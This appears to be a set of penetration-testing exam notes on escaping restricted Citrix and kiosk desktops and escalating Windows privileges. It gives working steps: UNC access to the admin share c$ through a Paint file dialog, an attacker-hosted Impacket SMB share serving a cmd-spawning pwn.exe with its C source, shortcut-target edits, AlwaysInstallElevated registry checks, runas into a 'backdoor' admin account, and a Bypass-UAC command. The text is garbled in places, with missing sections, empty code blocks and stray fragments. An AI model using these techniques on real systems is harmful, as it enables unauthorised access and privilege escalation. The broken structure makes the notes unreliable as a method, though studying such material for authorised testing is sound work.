# Citrix Breakout

## 1. Core Idea

Citrix, Terminal Services, AWS AppStream, CyberArk PSM, kiosks, and similar platforms can place users inside a **restricted desktop environment**.

The goal of a **breakout** is to escape the restrictions and regain normal interaction with the underlying Windows OS.

### Exam Mental Model

Think of the attack as:

```text
Restricted Desktop
       ↓
Get a Dialog Box
       ↓
Reach a restricted path / file
       ↓
Achieve Command Execution
       ↓
Get CMD / PowerShell
       ↓
Enumerate Windows
       ↓
Privilege Escalation
       ↓
Higher-privileged access
```

### Basic Breakout Methodology

1. Gain access to a **Dialog Box**
    
2. Use the dialog box to achieve **command execution**
    
3. **Escalate privileges**
    

The important exam idea is that **GUI restrictions are not necessarily OS-level restrictions**. A restricted File Explorer does not automatically mean Windows itself is restricted.

# 3. Bypassing Path Restrictions

## Problem

Suppose File Explorer prevents access to:

```text
C:\Users
```

or other locations.

This usually indicates that **Group Policy restrictions** have been applied to the desktop.

However, other Windows applications may still expose a **File Open / Save dialog**.

That dialog may not enforce the same restrictions as File Explorer.

### Key Principle

> **If File Explorer is restricted, look for another application that can open a Windows file dialog.**

```text

```

# 5. Using UNC Paths to Bypass Restrictions

Open:

```text
Paint
```

Then:

```text
File → Open
```

In the **File name** field, enter:

```text
\\127.0.0.1\c$\users\pmorgan
```

Set:

```text
File Type → All Files
```

Then press:

```text
Enter
```

### Why does this work?

The path is a **UNC path**:

```text
\\server\share
```

Here:

```text
\\127.0.0.1
```

means the local machine.

And:

```text
c$
```

is the administrative SMB share corresponding to:

```text
C:\
```

Therefore:

```text
\\127.0.0.1\c$\users\pmorgan
```

effectively targets:

```text
C:\Users\pmorgan
```

### Exam Memory Trick

```text
C:\Users
```

may be blocked by Explorer.

Try:

```text
\\127.0.0.1\c$\Users
```

through a Windows file dialog.

The important concept is **not the exact path**. It is:

> **Use a Windows dialog + UNC path to access a location that normal Explorer navigation blocks.**

# 6. Accessing an SMB Share from the Restricted Environment

Another useful technique is using the same UNC path mechanism to access an SMB share on another machine.

## Step 1 — Start an SMB Server

On the attacker/Ubuntu machine:

```bash
smbserver.py -smb2support share $(pwd)
```

### What this does

`smbserver.py` is an Impacket utility that creates an SMB server.

Breakdown:

```text
smbserver.py
```

Starts the SMB server.

```text
-smb2support
```

Enables SMB2 support.

```text
share
```

The name of the SMB share.

```text
$(pwd)
```

Shares the current directory.

So if the current directory contains:

```text
pwn.exe
PowerUp.ps1
...
```

they become available through the SMB share.

# 8. Executing a Binary from the SMB Share

The source notes that copying may be restricted, but executables can still sometimes be launched directly.

For example:

```text
pwn.exe
```

Right-click:

```text
Open
```

This executes the binary.

The binary is simply a custom program that launches CMD.

---

# 9. Understanding `pwn.c`

Code:

```c
#include <stdlib.h>

int main() {
    system("C:\\Windows\\System32\\cmd.exe");
}
```

### Why does this work?

The important function is:

```c
system()
```

It asks Windows to execute the supplied command.

Here:

```c
system("C:\\Windows\\System32\\cmd.exe");
```

launches:

```text
cmd.exe
```

Therefore:

```text
Restricted GUI
      ↓
Open File Dialog
      ↓
SMB Share
      ↓
pwn.exe
      ↓
system(...)
      ↓
cmd.exe
```

### Exam Concept

You do **not** necessarily need to locate `cmd.exe` manually.

You may instead:

1. Obtain a way to execute a binary.
    
2. Use that binary to launch `cmd.exe`.

# 10. Copying Files After Getting CMD

Once CMD is available, restrictions can often be bypassed more easily.

The source notes that files can then be copied from the SMB share to the user's Desktop.

Conceptually:

```text
SMB Share
   ↓
CMD
   ↓
Copy required tools
   ↓
Local filesystem
```

This is important because the **breakout goal is usually to transition from GUI-only interaction to command-line access**.

```text

```

- Fast

### Why is a portable application useful?

If installation is restricted, a portable executable may still run.

Therefore:

```text

     ❌

     ✅
```

### Exam Concept

> **A policy blocking one application does not automatically mean every alternative application has the same restrictions.**

# 13. Modifying an Existing Shortcut

Another breakout technique is modifying a Windows shortcut.

## Method

1. Right-click the shortcut.
    
2. Select:
    
    ```text
    Properties
    ```
    
3. Modify the:
    
    ```text
    Target
    ```
    
4. Point it toward the desired executable/path.
    
5. Execute the shortcut.
    

The source states that this can result in CMD being spawned.

### Why does this matter?

A shortcut is essentially a stored instruction for launching something.

If you can modify:

```text
Target
```

you may be able to change what gets executed.

### Mental Model

```text
Trusted shortcut
      ↓
Modify Target
      ↓
Launch arbitrary executable
      ↓
Command execution
```

```text

        ↓

        ↓
Script interpreter
        ↓
Command execution
```


# 18. Always Install Elevated

One important Windows privilege escalation technique is:

```text
AlwaysInstallElevated
```

This Windows policy can allow MSI packages to install with elevated privileges.

The source demonstrates checking both:

```text
HKCU
```

and:

```text
HKLM
```

---

# 19. Check `AlwaysInstallElevated` from CMD

### HKCU

Run:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Expected vulnerable value:

```text
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

### HKLM

Run:

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Expected vulnerable value:

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

---

# 20. Why Check Both Registry Locations?

The important exam detail is:

```text
HKCU = Current User
HKLM = Local Machine
```

For the configuration to be exploitable in the way demonstrated, the relevant policy must be enabled at both levels.

### Memorize

```text
AlwaysInstallElevated
        +
HKCU = 1
        +
HKLM = 1
        ↓
Potential MSI privilege escalation
```

Do not stop after finding only one registry key.

# 24. Using `runas`

Once the user exists, CMD can be launched as that account:

```cmd
runas /user:backdoor cmd
```

Windows will prompt for the password:

```text
Enter the password for backdoor:
```

Then:

```text
Attempting to start cmd as user "VDESKTOP3\backdoor" ...
```

### Why use `runas`?

`runas` allows a program to run under another user's credentials.

General syntax:

```cmd
runas /user:<username> <program>
```

Example:

```cmd
runas /user:backdoor cmd
```

# 25. Important: Administrator Group ≠ Full Administrator Token

At this point, even though:

```text
backdoor ∈ Administrators
```

you may still be unable to access:

```text
C:\Users\Administrator
```

For example:

```cmd
cd C:\Users\Administrator
```

may return:

```text
Access is denied.
```

This is because of **UAC**.

---

# 26. Understanding UAC

UAC = **User Account Control**

Its purpose is to prevent applications from automatically using high-privilege administrator access.

An account can be:

```text
Member of Administrators
```

but the current process may still be running with a restricted/filtered token.

### Exam Mental Model

```text
Administrator group membership
          ≠
Automatically elevated process
```

This distinction is extremely important.

---

# 27. UAC Bypass

The source references UAC bypass scripts.

Example:

```powershell
Import-Module .\Bypass-UAC.ps1
```

Then:

```powershell
Bypass-UAC -Method UacMethodSysprep
```

The referenced method is:

```text
UacMethodSysprep
```

### Objective

The goal is to start a process with a higher-privileged administrative context without receiving the normal UAC restriction.

Conceptually:

```text
Admin account
    ↓
Filtered token
    ↓
UAC bypass
    ↓
Elevated process
```

---

# 28. Verify Privileges After UAC Bypass

Use:

```cmd
whoami /all
```

or:

```cmd
whoami /priv
```

### `whoami /all`

Shows comprehensive information about:

- Current user
    
- Group memberships
    
- Privileges
    
- Token information
    

### `whoami /priv`

Focuses specifically on:

```text
User privileges
```

### Exam Rule

After every privilege escalation attempt:

```text
whoami
```

and preferably:

```text
whoami /all
```

Use the output to verify whether the privilege level actually changed.

Do not assume that spawning a new shell means the exploit worked.

# 31. Important Exam Distinctions

## File Explorer vs Windows

A restriction on:

```text
File Explorer
```

does **not** necessarily mean:

```text
Windows filesystem is inaccessible.
```

Try another interface.

---

## Restricted GUI vs Command Execution

The real goal of the breakout is usually:

```text
GUI restriction
      ↓
Command execution
```

Once you have:

```text
cmd.exe
```

enumeration becomes much easier.

---

## Admin Group vs Elevated Token

This is a very important distinction:

```text
Administrator group membership
```

does not necessarily mean:

```text
Elevated process
```

UAC may still be restricting the current token.

---

## Automated Enumeration vs Manual Verification

PowerUp / WinPEAS:

```text
Automated discovery
```

Registry commands:

```text
Manual verification
```

Know both.

# 32. Exam Checklist

When facing a restricted Citrix/Windows desktop:

-  Can I open **Paint / Notepad / WordPad**?
    
-  Can I trigger a **File Open / Save dialog**?
    
-  Can I enter a **UNC path** manually?
    
-  Can I access:
    
    ```text
    \\127.0.0.1\c$\...
    ```
    
-  Can I access an attacker SMB share?
    
-  Can I execute a binary from that share?
    
-  Can I use a `.bat`, `.vbs`, or `.ps` file?
    
-  Can I modify an existing `.lnk` shortcut?
    
-  Can I use an alternate file manager such as `Explorer++`?
    
-  Can I use an alternate registry editor?
    
-  Once I get CMD, have I run:
    
    ```cmd
    whoami /all
    ```
    
-  Have I used WinPEAS / PowerUp for enumeration?
    
-  Have I checked:
    
    ```text
    AlwaysInstallElevated
    ```
    
-  Did I check **both HKCU and HKLM**?
    
-  If I obtained an Administrator account, did I consider **UAC**?
    
-  Did I verify the final privilege level instead of assuming success?

## Final Takeaway

The most important lesson from this section is:

> **Do not treat the restricted GUI as the security boundary.**

A Citrix breakout often follows this progression:

```text
GUI restriction
    ↓
Find an alternate interface
    ↓
Obtain a Windows dialog
    ↓
Use UNC / SMB / alternate applications
    ↓
Get command execution
    ↓
Perform normal Windows privilege escalation
```

For exam questions, recognize the **conceptual chain** rather than memorizing only one exact exploit. The techniques are variations of the same idea: **find a trusted Windows functionality that the lockdown forgot to restrict**.
